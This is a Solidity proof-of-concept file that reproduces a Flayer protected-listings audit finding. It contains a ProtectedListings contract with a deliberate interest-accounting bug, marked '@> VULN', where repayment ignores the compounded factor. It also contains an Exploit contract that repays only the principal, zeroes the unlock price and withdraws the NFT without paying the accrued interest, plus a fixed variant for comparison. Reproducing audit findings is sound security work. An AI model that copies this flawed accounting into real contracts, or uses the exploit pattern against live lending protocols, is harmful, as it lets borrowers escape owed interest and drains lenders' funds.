// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer H-11 (Sherlock 2024-08, issue 269).
    ProtectedListings.adjustPosition subtracts the nominal repayment from
    tokenTaken and ignores the compounded factor. After 7 days the unlock
    price of a 0.4 ether listing is 402055890410801920. Repaying 0.4 ether
    zeroes tokenTaken, unlockPrice falls to 0, and the NFT is released
    without the 2055890410801920 interest.
*/

contract CollectionToken {
    string public symbol = "COLL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function denomination() external pure returns (uint256) {
        return 0;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }

    function burnFrom(address from, uint256 amount) external {
        if (amount != 0) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract Nft {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "nft");
        ownerOf[id] = to;
    }
}

contract Locker {
    Nft public nft;
    CollectionToken public ct;
    bool public paused;

    constructor(Nft _nft, CollectionToken _ct) {
        nft = _nft;
        ct = _ct;
    }

    function collectionToken(address) external view returns (CollectionToken) {
        return ct;
    }

    function withdrawToken(address, uint256 id, address to) external {
        address holder = nft.ownerOf(id);
        nft.transferFrom(holder, to, id);
    }
}

contract ProtectedListings {
    uint256 public constant MAX_PROTECTED_TOKEN_AMOUNT = 0.95 ether;
    struct Checkpoint {
        uint256 compoundedFactor;
        uint256 timestamp;
    }
    struct ProtectedListing {
        address owner;
        uint96 tokenTaken;
        uint256 checkpoint;
    }

    Locker public locker;
    CollectionToken public ct;
    mapping(address => mapping(uint256 => ProtectedListing)) internal _protectedListings;
    mapping(address => Checkpoint[]) public checkpoints;
    uint256 public paid;
    uint256 public feeBurned;
    address public collection;

    constructor(Locker _locker, CollectionToken _ct) {
        locker = _locker;
        ct = _ct;
    }

    function seed(address _collection, address owner) external {
        collection = _collection;
        _protectedListings[_collection][0] = ProtectedListing({owner: owner, tokenTaken: uint96(0.4 ether), checkpoint: 0});
        // Checkpoints already reflect the report's 7-day compound. No warp.
        checkpoints[_collection].push(Checkpoint({compoundedFactor: 1e18, timestamp: 0}));
        checkpoints[_collection].push(Checkpoint({compoundedFactor: 1005139726027004800, timestamp: 1}));
    }

    function tokenTaken(address _collection, uint256 id) external view returns (uint256) {
        return _protectedListings[_collection][id].tokenTaken;
    }

    function compound(uint256 _principle, Checkpoint memory initialCheckpoint, Checkpoint memory currentCheckpoint)
        public
        pure
        returns (uint256 compoundAmount_)
    {
        if (initialCheckpoint.timestamp >= currentCheckpoint.timestamp) return _principle;
        uint256 compoundedFactor = currentCheckpoint.compoundedFactor * 1e18 / initialCheckpoint.compoundedFactor;
        compoundAmount_ = _principle * compoundedFactor / 1e18;
    }

    function _currentCheckpoint(address _collection) internal view returns (Checkpoint memory) {
        return checkpoints[_collection][checkpoints[_collection].length - 1];
    }

    function unlockPrice(address _collection, uint256 _tokenId) public view returns (uint256 unlockPrice_) {
        ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
        unlockPrice_ = this.compound(
            listing.tokenTaken, checkpoints[_collection][listing.checkpoint], _currentCheckpoint(_collection)
        );
    }

    function getProtectedListingHealth(address _collection, uint256 _tokenId) public view returns (int256) {
        return int256(MAX_PROTECTED_TOKEN_AMOUNT) - int256(unlockPrice(_collection, _tokenId));
    }

    function adjustPosition(address _collection, uint256 _tokenId, int256 _amount) public {
        if (_amount == 0) revert("NoPositionAdjustment");
        ProtectedListing memory protectedListing = _protectedListings[_collection][_tokenId];
        if (protectedListing.owner != msg.sender) revert("CallerIsNotOwner");
        int256 debt = getProtectedListingHealth(_collection, _tokenId);
        uint256 absAmount = uint256(_amount < 0 ? -_amount : _amount);
        CollectionToken collectionToken = locker.collectionToken(_collection);
        if (_amount < 0) {
            if (debt + int256(absAmount) >= int256(MAX_PROTECTED_TOKEN_AMOUNT)) revert("IncorrectFunctionUse");
            collectionToken.transferFrom(msg.sender, address(this), absAmount * 10 ** collectionToken.denomination());
            paid = absAmount * 10 ** collectionToken.denomination();
            // @> VULN: tokenTaken is reduced by the nominal amount, not amount/compoundedFactor
            _protectedListings[_collection][_tokenId].tokenTaken -= uint96(absAmount);
        } else {
            if (_amount > debt) revert("InsufficientCollateral");
            collectionToken.transfer(msg.sender, absAmount * 10 ** collectionToken.denomination());
            _protectedListings[_collection][_tokenId].tokenTaken += uint96(absAmount);
        }
    }

    function unlockProtectedListing(address _collection, uint256 _tokenId, bool _withdraw) public {
        ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
        if (listing.owner != msg.sender) revert("CallerIsNotOwner");
        int256 collateral = getProtectedListingHealth(_collection, _tokenId);
        if (collateral < 0) revert("InsufficientCollateral");
        CollectionToken collectionToken = locker.collectionToken(_collection);
        uint256 denomination = collectionToken.denomination();
        uint96 taken = _protectedListings[_collection][_tokenId].tokenTaken;
        uint256 fee = unlockPrice(_collection, _tokenId) * 10 ** denomination;
        feeBurned = fee;
        collectionToken.burnFrom(msg.sender, fee);
        collectionToken.burn((1 ether - taken) * 10 ** denomination);
        delete _protectedListings[_collection][_tokenId];
        if (_withdraw) locker.withdrawToken(_collection, _tokenId, msg.sender);
    }
}

contract ProtectedListingsFixed {
    uint256 public constant MAX_PROTECTED_TOKEN_AMOUNT = 0.95 ether;
    struct Checkpoint {
        uint256 compoundedFactor;
        uint256 timestamp;
    }
    struct ProtectedListing {
        address owner;
        uint96 tokenTaken;
        uint256 checkpoint;
    }

    Locker public locker;
    mapping(address => mapping(uint256 => ProtectedListing)) internal _protectedListings;
    mapping(address => Checkpoint[]) public checkpoints;
    uint256 public priceAfter;

    constructor(Locker _locker) {
        locker = _locker;
    }

    function seed(address _collection, address owner) external {
        _protectedListings[_collection][0] = ProtectedListing({owner: owner, tokenTaken: uint96(0.4 ether), checkpoint: 0});
        checkpoints[_collection].push(Checkpoint({compoundedFactor: 1e18, timestamp: 0}));
        checkpoints[_collection].push(Checkpoint({compoundedFactor: 1005139726027004800, timestamp: 1}));
    }

    function compound(uint256 _principle, Checkpoint memory initialCheckpoint, Checkpoint memory currentCheckpoint)
        public
        pure
        returns (uint256)
    {
        uint256 compoundedFactor = currentCheckpoint.compoundedFactor * 1e18 / initialCheckpoint.compoundedFactor;
        return _principle * compoundedFactor / 1e18;
    }

    function unlockPrice(address _collection, uint256 id) public view returns (uint256) {
        ProtectedListing memory listing = _protectedListings[_collection][id];
        return this.compound(listing.tokenTaken, checkpoints[_collection][listing.checkpoint], checkpoints[_collection][checkpoints[_collection].length - 1]);
    }

    function tokenTakenOf(address _collection, uint256 id) external view returns (uint256) {
        return _protectedListings[_collection][id].tokenTaken;
    }

    function adjustPosition(address _collection, uint256 _tokenId, int256 _amount) public {
        uint256 absAmount = uint256(-_amount);
        uint256 price = unlockPrice(_collection, _tokenId);
        uint256 factor = checkpoints[_collection][checkpoints[_collection].length - 1].compoundedFactor;
        CollectionToken collectionToken = locker.collectionToken(_collection);
        collectionToken.transferFrom(msg.sender, address(this), absAmount);
        uint256 principalReduced = absAmount * 1e18 / factor;
        _protectedListings[_collection][_tokenId].tokenTaken -= uint96(principalReduced);
        priceAfter = price;
    }
}

contract Exploit {
    CollectionToken public ct;
    Nft public nft;
    Locker public locker;
    ProtectedListings public listings;
    address public collection;
    uint256 public fairPrice;
    uint256 public priceAfter;
    uint256 public constant FAIR = 402055890410801920;
    uint256 public constant PRINCIPAL = 0.4 ether;
    uint256 public constant SHORTFALL = 2055890410801920;

    constructor() {
        ct = new CollectionToken();
        nft = new Nft();
        locker = new Locker(nft, ct);
        listings = new ProtectedListings(locker, ct);
        collection = address(nft);
        ct.mint(address(listings), 0.6 ether);
        ct.mint(address(this), PRINCIPAL);
        nft.mint(address(locker), 0);
        listings.seed(collection, address(this));
    }

    function run() external {
        fairPrice = listings.unlockPrice(collection, 0);
        ct.approve(address(listings), PRINCIPAL);
        listings.adjustPosition(collection, 0, -int256(PRINCIPAL));
        priceAfter = listings.unlockPrice(collection, 0);
        listings.unlockProtectedListing(collection, 0, true);
        require(fairPrice == FAIR, "fair");
        require(listings.paid() == PRINCIPAL, "paid");
        require(priceAfter == 0, "zeroed");
        require(listings.feeBurned() == 0, "fee");
        require(nft.ownerOf(0) == address(this), "nft");
        require(FAIR - PRINCIPAL == SHORTFALL, "short");
        require(listings.tokenTaken(collection, 0) == 0, "taken");
    }
}
